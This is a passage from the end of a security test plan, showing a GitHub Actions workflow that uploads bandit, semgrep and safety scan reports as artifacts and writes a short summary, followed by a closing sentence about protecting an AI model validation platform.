      - name: Upload security reports
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: security-reports
          path: |
            security-results.xml
            bandit-report.json
            semgrep-report.json
            safety-report.json
            security_scan_report.md
      
      - name: Security report summary
        if: always()
        run: |
          echo "## Security Test Summary" >> $GITHUB_STEP_SUMMARY
          echo "Security tests completed. Check artifacts for detailed reports." >> $GITHUB_STEP_SUMMARY
```

This comprehensive security test plan ensures the AI Model Validation Platform is protected against common security vulnerabilities and follows security best practices throughout the development lifecycle.